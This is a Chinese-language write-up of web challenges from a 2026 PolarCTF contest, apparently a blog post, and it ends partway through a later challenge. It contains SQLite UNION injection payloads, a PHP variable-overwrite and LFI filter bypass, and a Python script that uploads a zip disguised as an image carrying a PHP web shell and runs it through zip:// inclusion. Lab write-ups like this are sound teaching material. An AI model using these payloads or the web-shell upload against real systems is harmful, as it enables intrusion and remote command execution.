---
title: 【CTF】2026PolarCTF春季赛wp（WEB篇）
url: https://mp.weixin.qq.com/s/yjiTfc7QA2JQtdKlIrWfPw
source: Doonsec's feed
date: 2026-03-23
fetch_date: 2026-03-24T04:11:55.738357
---

# 【CTF】2026PolarCTF春季赛wp（WEB篇）

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/jrJgiaU27tgx1meu7R0PEH2URqichefoRbeQq7f3MkLCCG1Yo6ov5Srtia3PfdRicXVexNA6kWTsnOlxEialAeib5WibqqWnsJYKrstFdR1PdiaPKUo/0?wx_fmt=jpeg)

# 【CTF】2026PolarCTF春季赛wp（WEB篇）

原创

小叶Sec
小叶Sec

小叶Sec

![]()

在小说阅读器中沉浸阅读

# 前言

> 本次比赛最终排名是71名，因为容器原因**web**题崩一会好一会，加起来等了几个小时的容器时间，1，2个小时吧，其实一开始是打云枢杯的，可惜因为某种原因打不了，然后**叁玖老师**推荐了这个，所以总的来说应该就打了5，6个小时，等容器时间1，2个小时，获得71名，也挺不错了，并且写wp时间有点短，我晚点交给主办方了也不知道有没有效

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jrJgiaU27tgzTjUCS4yZA3cSpYvlrSQZ43iaeID8FdGicWmhoSxnibJHiaibgokIFe3ic3MdiccpjbXopzJ1ibwl2r113Nd9RK3tNFtKZ8vJjmfEnzyE/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/jrJgiaU27tgwksGIGR3xyhBHpNiaJM2ouTibeNNFolsKrAt2VM8BUAhWMdvAo9LNgsMaJr8YsAPKwnI1yiayl4kQlrswLxdx1N9Y02tdyT8uwVs/640?wx_fmt=png&from=appmsg)
> 这里在推荐一下叁玖老师写的wp，很强，第二名，id是小月，pwn也是ak了，pwn大手子了也是

[2026PolarCTF春季赛wp](https://mp.weixin.qq.com/s?__biz=MzY5NTEzMjUzMA==&mid=2247490565&idx=1&sn=2e1d5f62e0a04fddcf7dab30f27ac6e6&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/jrJgiaU27tgw6rN23XhW1KIkj91sTkCN77l21lS7CMqKmyr9XLOzhcicWNBcDJibyM0Mxmkr03EyomacAzfbr8zM4Joe2fRj7kDZWo3QKp3US4/640?wx_fmt=png&from=appmsg)

# 解题思路

## 3-1 sql\_search

![](https://mmbiz.qpic.cn/mmbiz_png/jrJgiaU27tgxDK4D8zX9A8IFR4fgEymL5uQtfNibj45gJZGYia6nIKibzdWWNqWmdSoBDB1lfpOxfMiafrbKxqMq3ARJHFjnTtxic2vkKergzOm2E/640?wx_fmt=png&from=appmsg)

这里打开是这样的，里面的web界面只有这个搜索框

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jrJgiaU27tgxDOajia6aiaWhEveFk0O5qwj3Wm06jBKZoguESiafZgRYXWQ4icic6IGj8NBoCFGwpoC7aCrsZwdPdiaibp8MGthV98QUa8D29Hzcx6Q/640?wx_fmt=png&from=appmsg)

我们随便数据一个数据直接使用sqlmap爆破一遍，毕竟100分的题目，也不可能难到哪里去，使用以下命令：

```
python sqlmap.py -u "http://ef9600e4-1c94-47b8-bb02-7637a6d5c14f.game.polarctf.com:8090//?search=test" -p search --batch
```

![](https://mmbiz.qpic.cn/mmbiz_png/jrJgiaU27tgzyWFdjgJH6XSC24SGzHVlN9U9NkynemdqIibAfQRPKtW0NaRcqZ9rMWo4o5AjejXN1HKAfJoSlFaw4Ubic4ccZTcHoWTqG9KjibA/640?wx_fmt=png&from=appmsg)

这里显示是不可注入的，有可能是SQLite数据库，我一般会直接探测加上指定数据库探测，因为有的sqlite可能探测不出来，需要重新探测一遍，所以使用以下命令继续探测一遍：

```
python sqlmap.py -u "http://ef9600e4-1c94-47b8-bb02-7637a6d5c14f.game.polarctf.com:8090//?search=test" -p search --dbms=SQLite --level=3 --risk=2 --batch
```

这里也失败了，看来需要手测了

![](https://mmbiz.qpic.cn/mmbiz_png/jrJgiaU27tgzeJtMCZKw2zVuia5DlbnM0zR27aZV6NsKT8dTkwex2ChfPLq8o48KPzBZhpk87bQl3tcQsuVB13fiahgHe7Qlh11VjqgjtGOsyc/640?wx_fmt=png&from=appmsg)

经过手动测试，发现应该是存在union注入

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jrJgiaU27tgwibQCyfl0fQCt3vrPWBWPdN0fj9CbdkKCibhPOagPHW6UwfnB2u6R6vCiakkh1MibR3gibvRvQM6m7Qa8ByibknZX2PTgBbR2pNjroA/640?wx_fmt=png&from=appmsg)

不同数据库的元数据查询方式不同，需先确定类型：

| 数据库名 | 利用方式 |
| --- | --- |
| SQLite | sqlite\_master |
| MySQL | information\_schema.tables |
| PostgreSQL | information\_schema.tables |

这里使用`’--+`看看怎么个事

![](https://mmbiz.qpic.cn/mmbiz_png/jrJgiaU27tgxxMZf1OJgUgctyXrowT8ZYOpMELJ5FCh7glfCshP83V7nibWMIibzLOa1AAy7rXLOsKMffrP3PpJbLeEDRuF4HU8jC7cMvJleqg/640?wx_fmt=png&from=appmsg)

这里发现直接全部数据都搜索出来了，没有明显的报错信息，我们直接测试吧，先从SQLite开始，构造以下命令：

```
1' UNION SELECT 1,name,sql FROM sqlite_master WHERE type='table'--+
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jrJgiaU27tgzEogly82icPVpnkrkoVH39R9ibwjcRONQpodvMzbPic2eeopic0JlrjAtLpiaiaa5bzNGbdmwyQQ6uhrB6RU0OXo3HAj8KEXwic0H2dA/640?wx_fmt=png&from=appmsg)

这里爆破出三张表，确认了是sqlite数据库，这里看名字flag应该在flaggggggggggg这个表中，盲猜字段名为flag，这里就不报字段名了，使用以下命令：

```
1' UNION SELECT 1,2,flag FROM flaggggggggggg--+
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jrJgiaU27tgwVFwKjtS4HmYssdjiaegqVPvanvUDG1ue4UPZOGq8icXHtLibhib02PH1UJ7uU9YdCksI9fd3QXFYEQB7iajdPHC4ThJ46hfYRZogI/640?wx_fmt=png&from=appmsg)

成功获取flag为:

```
flag{mdw736134659adi9203hjcbos}
```

## 3-2 The\_Gift

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jrJgiaU27tgyUeic75cibsI9AhO5qaaREBHjJm03soiby1Y37ujIa6iaWto2dgODjhiaP712n2kOJwftcXlibpicydJ7QDClTgAddc8adnv8qzUEYwE/640?wx_fmt=png&from=appmsg)

通过代码审计发现，这套程序在处理用户传入的 `GET` 和 `POST` 数据时，存在极其严重的变量覆盖漏洞。开发者使用了一个 `foreach` 循环配合可变变量 `$$key = $value` 的写法，这意味着我们可以通过外部传参，强行覆写掉 PHP 脚本内部原有的任何变量。

顺着代码逻辑往下看，我注意到程序一开始把 `$config` 实例化成了一个带有随机验证逻辑的对象。但极其矛盾的是，它在最终决定是否输出 `flag` 的条件判断里，偏偏要求 `$config` 必须是一个完整的数组，并且里面还要包含一个名为 `isAdmin` 且值为字符串 `true` 的键值对。这就给了我们借题发挥的空间。

为了满足这个条件，我们只需要针对性地构造 URL 参数，直接传入 `?config[isAdmin]=true`。由于变量覆盖漏洞的存在，系统在接收到这个参数后，会直接摧毁原本的 $config 鉴权对象，把它强行替换成我们精心捏造的数组结构，完美契合最终的判断条件。

![](https://mmbiz.qpic.cn/mmbiz_png/jrJgiaU27tgwpcswRdhj6KkiakGme9eH5DR1I8a4ynrpA4YrcnHhNmEOWVEicJP6RZK4NNbXmou4ePLibMSWZVQibUKEVfkARVXVWY4V9RwX6sAY/640?wx_fmt=png&from=appmsg)

成功获得flag：

```
flag{0538dfd69d21172b128c29d536b9b31a}
```

## 3-6 Pandora\_Box

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jrJgiaU27tgzYRcelc4NqIPdDoGecI6oNa0kVskuAOSUGHx0vhTDRFjNeHC0K8vqe7gRL8icbgsk53AVAZ94ZvKDB8MtFmCxbQFsJZqia4qa84/640?wx_fmt=png&from=appmsg)

这里直接打开发现是一个文件上传的，随便上传一个文件并跳转，发现报错了， url:`http://f475b4f3-5ff4-423f-b26b-d1ea394c18a8.www.polarctf.com:8090/?file=upload/a7899a2deeb97b82ad18b7b486b0c11c.png`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jrJgiaU27tgwiaedXCQB7uyrD9ouh6VkV057Kt0HdnoJsvhuDiafrkPaEIRibJCHqpzVddketyOibTa8H6SNRvjPQwOdkEMVABOBjxxcvGibAiclP0/640?wx_fmt=png&from=appmsg)

这里我们判断其存在LFI，我们可以使用zip://进行绕过，

绕过思路：

> 1.直接上传`.php`被拦截，需要借图片格式过校验。
> 2.利用 `zip`与`jpg`文件头无关：把`zip`命名为`.jpg`上传，服务器按扩展名放行。
> 3.使用`zip://`或`phar://`**（phar 也支持 zip 格式）**包含压缩包内的 PHP 文件。
> 4.后端会追加.php，因此传`zip://`路径`/xxx.jpg#shell`，拼接后变为`#shell.php`，即可执行包内的文件名`.php。`
> 5.`#`在 `URL`中表示`fragment`，不会随请求发给服务器，需写成`%23`。

使用脚本，构造exp:

```
import requests, re, zipfile, io
from urllib.parse import quote

HOST="http://f475b4f3-5ff4-423f-b26b-d1ea394c18a8.www.polarctf.com:8090/"
PROXIES = {"http": None, "https": None}

CODE = b"<?php passthru($_GET['cmd']??'id'); ?>"
bio = io.BytesIO()
with zipfile.ZipFile(bio, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr("cmd.php", CODE)
raw = bio.getvalue()

s = requests.Session()
s.proxies = PROXIES
r = s.post(HOST, files={"file": ("img.jpg", raw, "image/jpeg")}, proxies=PROXIES)
up = re.search(r'upload/[a-f0-9]+\.(?:jpg|png)', r.text)
if not up:
    raise SystemExit("解析不到路径")
p = up.group(0)
file_param = f"zip:///var/www/html/{p}#cmd"
full_url = f"{HOST.rstrip('/')}/?file={quote(file_param, safe='')}&cmd=cat%20/flag"
resp = s.get(full_url, proxies=PROXIES)
m = re.search(r'flag\{[^}]+\}', resp.text)
print(m.group(0) if m else resp.text[:500])
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jrJgiaU27tgy5y1RV3fr7J9b7EaXaSE5X3ZVL5En1xmNwD8DEzafocNY2tibQ2ngGVGZx9wDTcXo2sbGwcNvvexAI536Z6M9geMnUtfnib5v0Y/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/jrJgiaU27tgwaKxt2ESVVw4PXopzEhh7fiaAFeDbJZ4W90xPciaXaNrLVlsPnqHcLN7hAsgTZBtuW5DIM2e8XTGLO7YRbzoyJHSmUlibzTHpU4I/640?wx_fmt=png&from=appmsg)

成功获得flag为:

```
flag{47ea7bc31157e1a1a6ca01e26163b726}
```

## 3-7 static

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jrJgiaU27tgzxp0bM2ka15ESj8tkUZQpibvenhFld2dLmL61hXvl8zKNPGBNXNI1iaUzQzrqb2zibpBj61hOJLyaTrHwB4fupcaXXaKIDvsOx0g/640?wx_fmt=png&from=appmsg)

通过代码审计发现，程序在防范本地文件包含（LFI）漏洞时，开发者自己写了一个看似严格的`hard_filter`过滤函数，但实际上在黑名单的处理逻辑上留下了一个极其致命的破绽。

开发者试图用一个 `foreach` 循环去遍历排查输入路径里的敏感关键字（比如 `eval`、`system`、../ 等）。顺着代码逻辑往下看，我注意到一个非常匪夷所思的细节：在匹配到敏感词并用 `str_replace` 把它替换为空之后，开发者竟然紧接着写了一个 `break`; 语句！这意味着，过滤系统只要抓到了黑名单数组里排在最前面的那个敏感词，删掉它之后就会直接“打卡下班”，跳出整个检查循环，根本不管字符串的后面是不是还藏着其他更危险的符号。这就给了我们借题发挥的绝佳空间。

此外，程序在最后还强制校验了被过滤后的字符串必须以 `static/` 开头，并且会自动在结尾拼接 `.php`。为了同时满足所有条件并拿到 Flag，我们只需要针对性地构造 `URL` 参数，直接利用这种“掩护机制”传入：`?file=static/eval../flag`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jrJgiaU27tgx1aHqdtUy4eulxyUpyIIhtOYAWha88hmBR9gw5y97p6PibR6q1oud8WU6eXwT9vktCJEH2cU3vSRibibejsfUnJxnDePickz7r3VY/640?wx_fmt=png&from=appmsg)

成功获得flag：

```
 flag{030e77f73a4cb26a111daf0470c3956f}
```

## 3-10 coke的粉丝团

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jrJgiaU27tgy7B4VB5a7324RsejbUM1M8f5QfO3TF9u4OK8ABHia6muPHWHHsjeN8pyVRll4OuS8E1diaDXqVWHzKibNDKj7kGdHZcZKALYxVCY/640?wx_fmt=png&from=appmsg)

这里进去直接注册一个账号

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jrJgiaU27tgxR1XXiansOMpjPfJJRXicA5uibIcEFjYToeM9yb7QthXmORQy4lQ8x9sGlViaoW3nRTPIL4FmKSAgGLKEKicgeszWnomNYiclRlCKpw/640?wx_fmt=png&from=appmsg)
...